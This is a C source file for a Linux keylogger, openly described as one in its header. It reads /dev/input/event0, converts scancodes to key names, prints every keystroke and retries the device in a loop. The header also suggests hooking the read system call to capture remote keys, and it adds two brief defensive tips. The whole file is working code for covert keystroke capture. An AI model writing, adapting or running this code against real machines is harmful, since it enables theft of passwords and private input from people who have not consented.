/* event0log.c v0.9
 * <~~Harvie 2oo8-2o21
 * THX2:	Dayvee (Idea), joe@aol.com (Reversing),
 *				-=Punka][Tux=- (BugReport),
 *				Warriant's code (Inspiration), Linus (Linux)
 *
 * Converts /dev/input/event0 format to ASCII. (If you have nore keyboards,)
 * In other words: this is keylogger for Linux.
 * If you have more keyboards, try other events (event1, ...eventX).
 * Only local keyboard is supported,
 *  remote keys can be captured by hooking on SYS_read() system call.
 *
 * Build:
 * - gcc argv[0].c -o argv[0]
 *
 * Usage (all examples do the same):
 * - cat /dev/input/event0 | argv[0]
 * - argv[0] /dev/input/event0
 * - argv[0] -
 *
 * Adding new keystroke values:
 * - <XXX> = keystroke id
 * - set MAXSTROKE to 0 to get only keystroke values
 *
 * Defensive security:
 * - chown & chmod /dev/input/event0
 * - don't give cheap root to everybody
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#define DEFAULTINPUT "/dev/input/event0"

typedef struct __attribute__((__packed__)) input_event_s {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
} input_event_t;

time_t timestamp = 0;

#define MAXSTROKE 169 //Set higest keystroke code in DB (lower will not be converted)
char *strokes[] = { //KeyStroke DB for english QUERTZ keyboard:
	"<0>", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BKSP]", //14
	"[TAB]", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "[ENTER]\n", //28
	"[CTRL-L]", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "[SHIFT-L]", "\\", //44
	"Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "[SHIFT-R]", "*", "[ALT-L]", " ", //57
	"[CAPSL]","[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", //69
	"[NUML]", "[SCRL]", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", //83
	"[./DEL-NUM]", "<85>", "<86>", "[MACRO-\\|]", "[F11]", "[F12]",
	"<90>","<91>", "<92>", "<93>", "<94>", "<95>", "<96>", "[ENTER-NUM]\n",
	"[CTRL-R]", "/", "[PRT-SCR]", "[ALT-R(GR)]",	"<102>",
	"[HOME]", "[UP]", "[PG-UP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PG-DN]", "[INS]", "[DEL]",
	"<113>", "<114>", "<115>", "<116>", "<117>", "<118>", "[PAUSE]",
	"<120>", "<121>", "<122>", "<123>", "<124>", "<125>", "[WinbL0W$-L]", "[WIN-R]", "[CONTEXT-MENU]", "<128>", "<129>",
	"<130>", "<131>", "<132>", "<133>", "<134>", "<135>", "<136>", "<137>", "<138>", "<139>",
	"<140>", "<141>", "<142>", "[Fn]",  "<144>", "<145>", "<146>", "<147>", "<148>", "<149>",
	"<150>", "<151>", "<152>", "<153>", "<154>", "<155>", "<156>", "<157>",	"[BACK]", "[FORW]",
	"<160>", "<161>", "<162>", "[NEXTSONG]", "[PLAYPAUSE]", "[PREVSONG]", "[STOPCD]", "<167>", "<168>", "<169>"
	/* Hint:
		[CAPSL][ESC]	= CapsLock On
		[CAPSL]		= CapsLock Off
		[NUML]<0>	= NumLock On
		[NUML] 		= NumLock Off
		3[ESC]3		= Escape
	*/
};

void cleanup(void) {
	fclose(stdin);
	fclose(stdout);
}

static void sigint_handler(int signo) {
	exit(0);
}

int main(int argc, char *argv[]) {

	atexit(&cleanup);
	signal(SIGINT, &sigint_handler);
	signal(SIGTERM, &sigint_handler);
	signal(SIGQUIT, &sigint_handler);
	signal(SIGSEGV, &sigint_handler);


	printf("Scancode DB size: %d B (0-%d)", sizeof(strokes), MAXSTROKE);

	char * filepath = NULL;
	if(argc > 1 && argv[1][0] != '-') {
		filepath = &argv[1][0];
	}
	if(argc > 1 && argv[1][0] == '-') {
		filepath = DEFAULTINPUT;
	}


	while(1) {

	while(1) {
		if(filepath != NULL && freopen(filepath, "rb", stdin) == NULL) {
			printf("\n%lu\tFailed to open file %s", time(NULL), filepath);
			sleep(1);
			continue;
			//return(1);
		} else {
			if(filepath != NULL) printf("\n%lu\tOpened file %s\n", time(NULL), filepath);
			break;
		}
	}
	setbuf(stdout, NULL);


	input_event_t input_event;
	while(read(0, &input_event, sizeof(input_event_t)) != -1) {
		if(input_event.type != 1 || input_event.value != 1) continue;
		//printf("\n%lu\tTYPE:%d\tCODE:%d\tVAL:%d\t", input_event.time.tv_sec, input_event.type, input_event.code, input_event.value);
		if(input_event.code <= MAXSTROKE) {
			printf("%s", strokes[input_event.code]);
		} else {
			printf("<%d>", input_event.code);
		}
	}

	}

}
